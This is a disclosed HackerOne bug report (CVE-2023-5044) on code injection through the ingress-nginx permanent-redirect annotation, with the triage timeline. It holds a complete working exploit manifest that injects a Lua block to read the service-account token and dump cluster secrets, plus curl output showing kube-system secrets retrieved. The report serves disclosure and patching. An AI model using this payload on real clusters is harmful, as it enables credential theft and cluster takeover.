---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/code-injection
  - env/cloud
  - stack/kubernetes
  - stack/nginx
substate: "resolved"
weakness: "Code Injection"
enriched: true
body: true
date: 2023-10-25
submitted: 2023-06-26T23:46:37.276Z
bounty_usd: 2500
votes: 41
cve: "CVE-2023-5044"
program: "[[programs/kubernetes|Kubernetes]]"
reporter: "jkroepke"
source: "https://hackerone.com/reports/2039464"
title: "Code inject via nginx.ingress.kubernetes.io/permanent-redirect annotation"
---
# Code inject via nginx.ingress.kubernetes.io/permanent-redirect annotation

> **Severity:** High | **Bounty:** 2,500 USD | **Votes:** 41 | **Program:** Kubernetes | **Disclosed:** 2023-10-25

- Report: [https://hackerone.com/reports/2039464](https://hackerone.com/reports/2039464)
- CWE: Code Injection | CVE: CVE-2023-5044
- Submitted: 2023-06-26T23:46:37.276Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Report Submission Form

## Summary:
The value of the `nginx.ingress.kubernetes.io/permanent-redirect` annotation will be not sanitized and passed into the nginx configuration. This leads into a code inject from any user that is allowed to create ingress objects.

## Kubernetes Version:
v1.26.3 (minikube)

## Component Version:
```
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.8.0
  Build:         35f5082ee7f211555aaff431d7c4423c17f8ce9e
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.21.6

-------------------------------------------------------------------------------
```

## Steps To Reproduce:

  1. Install ingress-nginx, using latest version and default values. For demo purpose, I set `allow-snippet-annotations=false`
        ```bash
        helm upgrade -i ingress-nginx ingress-nginx/ingress-nginx -f values.yaml # values.yaml is attached
        ```
  1. apply service and ingress object from attachments
        ```bash
        k apply -f ingress.yaml #ingress.yaml is attached
        ```
  1. Optional: If ingress-nginx is not exposed, run `kubectl port-forward deploy/ingress-nginx-controller 8080:80` and continue step 4 in a separate shell.
  1. Validate, if the code is injected. This demo uses the hostname `kubernetes.api`, use the `--resolve` parameter of curl to do an request for the hidden server instance. The code below expect that ingress-nginx is accessible trough 127.0.0.1:8080

        ```bash
        curl -v --resolve "kubernetes.api:8080:127.0.0.1" http://kubernetes.api:8080/api/v1/namespaces/kube-system/secrets/
        ```

## Supporting Material/References:

  * values.yaml - Used in step 1
  * ingress.yaml - Used in step 2

## Impact

All users with access to create or update ingress objects, are able to running commands on ingress-nginx-controller pod. Since the token of the ServiceAccount is mounted on filesystem, a user can call the Kubernetes API and fetch all secrets or config maps from the cluster. Additionally, the user can read or write files to the filesystem.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **Report New**
- **Report Needs More Info**
- **2023-07-08** @h1_analyst_julian: Hello @jkroepke, 

Thanks again for your patience. I have another update. The cluster appears to be up and running, but the secrets are not being sent in the response. Here is the output of the commands from when I spooled up a new ingress pod with your malicious ingress.yaml file through sending the web request that should return the service account token: 

```
ls
demo.webm	ingress.yaml	values.yaml
$ cat values.yaml 
controller:
  config:
    allow-snippet-annotations: false
$ cat ingress.yaml 
apiVersion: v1
kind: Service
metadata:
  name: evil-ingress
spec:
  type: ClusterIP
  ports:
    - port: 9999
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: evil-ingress
  annotations:
    nginx.ingress.kubernetes.io/permanent-redirect: |
      https://exmaple.com;
      
      } # close location

      } # close server
      server {
        server_name kubernetes.api;

        listen 80  ;
        listen [::]:80  ;
        listen 443  ssl http2 ;
        listen [::]:443  ssl http2;
      
        location /api/ {
          content_by_lua_block{
            local httpc = require("resty.http").new()
            local file = io.open("/var/run/secrets/kubernetes.io/serviceaccount/token", "rb")
            local token = file:read "*a"
            file:close()
    
            local res, err = httpc:request_uri("https://kubernetes.default.svc.cluster.local" .. ngx.var.uri, {
              ssl_verify = false,
              method = "GET",
              headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded",
                ["Authorization"] = "Bearer " .. token,
              },
            })
      
            ngx.say(res.body)
          }
        }
      }

      server {
        server_name any.domain;
        location /foo/ {
          set $foo "aaa"
spec:
  ingressClassName: nginx
  rules:
    - host: invalid.domain
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: default
                port:
                  number: 9999

$ helm upgrade -i ingress-nginx ingress-nginx/ingress-nginx -f values.yaml
Release "ingress-nginx" does not exist. Installing it now.
Error: rendered manifests contain a resource that already exists. Unable to continue with install: ClusterRole "ingress-nginx" in namespace "" exists and cannot be imported into the current release: invalid ownership metadata; annotation validation error: key "meta.helm.sh/release-namespace" must equal "default": current value is "ingress-nginx"

$ kubectl apply -f ingress.yaml
service/evil-ingress created
ingress.networking.k8s.io/evil-ingress created

$ kubectl get pods
NAME                    READY   STATUS    RESTARTS       AGE
demo-7745b7b64f-nh4cl   1/1     Running   1 (111m ago)   7d21h

$kubectl get pod demo-7745b7b64f-nh4cl --template='{{(index (index .spec.containers 0).ports 0).containerPort}}{{"\n"}}'
80

$ kubectl port-forward demo-7745b7b64f-nh4cl 9999:80
Forwarding from 127.0.0.1:9999 -> 80
Forwarding from [::1]:9999 -> 80

% curl -v --resolve "kubernetes.api:9999:127.0.0.1" http://kubernetes.api:9999/api/v1/namespaces/kube-system/secrets/

* Added kubernetes.api:9999:127.0.0.1 to DNS cache
* Hostname kubernetes.api was found in DNS cache
*   Trying 127.0.0.1:9999...
* Connected to kubernetes.api (127.0.0.1) port 9999 (#0)
> GET /api/v1/namespaces/kube-system/secrets/ HTTP/1.1
> Host: kubernetes.api:9999
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 404 Not Found
< Date: Sat, 08 Jul 2023 05:26:43 GMT
< Server: Apache/2.4.57 (Unix)
< Content-Length: 196
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
* Connection #0 to host kubernetes.api left intact
```
Here is the pod page from my kubernetes dashboard if that helps. 

{F2478712}

Can you see anything that I have mistyped here? 

Best Regards,
@h1_analyst_julian
- **Report New**
- **2023-07-08** @jkroepke: Please note that: To validate the report, an additional demo/test pod is not required. The "evil-ingress" ingress does not need a valid pod in backend.
- **Report Needs More Info**
- **Report New**
- **Hacker Requested Mediation**
- **Report Triaged**
- **Report Severity Updated**
- **2023-08-01** @jkroepke: Hi @h1_analyst_oliver 

what are the next steps here? The last update are already 15 days ago.
- **2023-08-02** @h1_analyst_lea: Thanks @jkroepke for reaching out.

Unfortunately we don't have new information to share at the time. 

We will let you know, if there are any new updates on the report.

Thanks for your patience!

Thanks,
@h1_analyst_lea
- **2023-09-13** @jkroepke: Hi @h1_analyst_lea,

after another six weeks, I may ask how much time is required here?

Thanks,
@jkroepke
- **2023-09-15** @cjcullen: Apologies. The ingress-nginx team is still working on cutting a release that should mitigate this issue.
- **2023-09-25** @jkroepke: Hi @cjcullen 

the new release 1.9.0 is out and I can confirm that the issue still exists. I follow the steps from the first post and I'm still able to fetch secrets from remote namespaces

```
% curl -v --resolve "kubernetes.api:8080:127.0.0.1" http://kubernetes.api:8080/api/v1/namespaces/kube-system/secrets/
* Added kubernetes.api:8080:127.0.0.1 to DNS cache
* Hostname kubernetes.api was found in DNS cache
*   Trying 127.0.0.1:8080...
* Connected to kubernetes.api (127.0.0.1) port 8080 (#0)
> GET /api/v1/namespaces/kube-system/secrets/ HTTP/1.1
> Host: kubernetes.api:8080
> User-Agent: curl/8.1.2
> Accept: */*
> 
Handling connection for 8080
< HTTP/1.1 200 OK
< Date: Mon, 25 Sep 2023 18:20:40 GMT
< Content-Type: text/html
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
{"kind":"SecretList","apiVersion":"v1","metadata":{"resourceVersion":"842"},"items":[{"metadata":{"name":"bootstrap-token-tv0nj9","namespace":"kube-system","uid":"bb6e6fcd-1702-4678-8ccf-969c1737e74b","resourceVersion":"258","creationTimestamp":"2023-09-25T18:17:43Z","managedFields":[{"manager":"kubeadm","operation":"Update","apiVersion":"v1","time":"2023-09-25T18:17:43Z","fieldsType":"FieldsV1","fieldsV1":{"f:data":{".":{},"f:auth-extra-groups":{},"f:expiration":{},"f:token-id":{},"f:token-secret":{},"f:usage-bootstrap-authentication":{},"f:usage-bootstrap-signing":{}},"f:type":{}}}]},"data":{"auth-extra-groups":"c3lzdGVtOmJvb3RzdHJhcHBlcnM6a3ViZWFkbTpkZWZhdWx0LW5vZGUtdG9rZW4=","expiration":"MjAyMy0wOS0yNlQxODoxNzo0M1o=","token-id":"dHYwbmo5","token-secret":"Zmc1dTF1eHM3azcwaWthOQ==","usage-bootstrap-authentication":"dHJ1ZQ==","usage-bootstrap-signing":"dHJ1ZQ=="},"type":"bootstrap.kubernetes.io/token"}]}
```

```
% k logs deploy/ingress-nginx-controller
-------------------------------------------------------------------------------
NGINX Ingress controller
  Release:       v1.9.0
  Build:         4bd3d6b8a00b01b009f225a5593ce502cce5c26b
  Repository:    https://github.com/kubernetes/ingress-nginx
  nginx version: nginx/1.21.6

-------------------------------------------------------------------------------

W0925 18:19:03.718785       7 client_config.go:618] Neither --kubeconfig nor --master was specified.  Using the inClusterConfig.  This might not work.
I0925 18:19:03.718973       7 main.go:205] "Creating API client" host="https://10.96.0.1:443"
I0925 18:19:03.727578       7 main.go:249] "Running in Kubernetes cluster" major="1" minor="27" git="v1.27.4" state="clean" commit="fa3d7990104d7c1f16943a67f11b154b71f6a132" platform="linux/amd64"
W0925 18:20:38.999709       7 endpointslices.go:82] Error obtaining Endpoints for Service "default/default": no object matching key "default/default" in local store
W0925 18:20:38.999770       7 controller.go:1214] Service "default/default" does not have any active Endpoint.
I0925 18:20:39.057008       7 admission.go:149] processed ingress via admission controller {testedIngressLength:1 testedIngressTime:0.057s renderingIngressLength:1 renderingIngressTime:0s admissionTime:19.1kBs testedConfigurationSize:0.057}
I0925 18:20:39.057079       7 main.go:107] "successfully validated configuration, accepting" ingress="default/evil-ingress"
I0925 18:20:39.064868       7 store.go:440] "Found valid IngressClass" ingress="default/evil-ingress" ingressclass="nginx"
I0925 18:20:39.065495       7 event.go:298] Event(v1.ObjectReference{Kind:"Ingress", Namespace:"default", Name:"evil-ingress", UID:"69331489-8534-4a4f-8997-53818e7081e4", APIVersion:"networking.k8s.io/v1", ResourceVersion:"839", FieldPath:""}): type: 'Normal' reason: 'Sync' Scheduled for sync
W0925 18:20:39.065545       7 endpointslices.go:82] Error obtaining Endpoints for Service "default/default": no object matching key "default/default" in local store
W0925 18:20:39.065562       7 controller.go:1214] Service "default/default" does not have any active Endpoint.
I0925 18:20:39.065627       7 controller.go:190] "Configuration changes detected, backend reload required"
I0925 18:20:39.186862       7 controller.go:210] "Backend successfully reloaded"
I0925 18:20:39.187207       7 event.go:298] Event(v1.ObjectReference{Kind:"Pod", Namespace:"default", Name:"ingress-nginx-controller-7ddd87655-5chx4", UID:"14c5a9d8-45c9-41fa-9dae-6dacf231ff19", APIVersion:"v1", ResourceVersion:"650", FieldPath:""}): type: 'Normal' reason: 'RELOAD' NGINX reload triggered due to a change in configuration
127.0.0.1 - - [25/Sep/2023:18:20:40 +0000] "GET /api/v1/namespaces/kube-system/secrets/ HTTP/1.1" 200 933 "-" "curl/8.1.2" 120 0.010 [] [] - - - - f0ab0d83cfb44dcf19e1020edd678e2b
```

The new version 1.9.0 does NOT mitigate the issue.
- **2023-09-25** @cjcullen: @jkroepke thank you so much for proactively attempting to verify. I've taken your notes back to the ingress-nginx team and will keep you posted on their response.
- **Report Severity Updated**
- **Report Retesting**
- **User Completed Retest**
- **2023-09-27** @cjcullen: @jkroepke did you test with the `--enable-annotation-validation` flag?
- **2023-09-28** @jkroepke: Hi @cjcullen 

No, I do the retest with the 1.9.0 default settings. After enable the `--enable-annotation-validation` flag, I got the error on the kubectl create command:

> Error from server (BadRequest): error when creating "ingress.yaml": admission webhook "validate.nginx.ingress.kubernetes.io" denied the request: annotation nginx.ingress.kubernetes.io/permanent-redirect contains invalid value

This denies the creation of the ingress resource and mitigate the issue.
- **Bounty Awarded**
- **2023-10-08** @jkroepke: Hi,

please credit me as "Jan-Otto Kröpke (Cloudeteer GmbH)".

Thanks!
- **2023-10-11** @jkroepke: Hello @cjcullen,

Thanks for the reward. I appreciate it much. Since you are request a retest through hackerone process, I kindly ask if you already approved the my retest procedure?
- **Report Retest Approved**
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Cve Id Added**
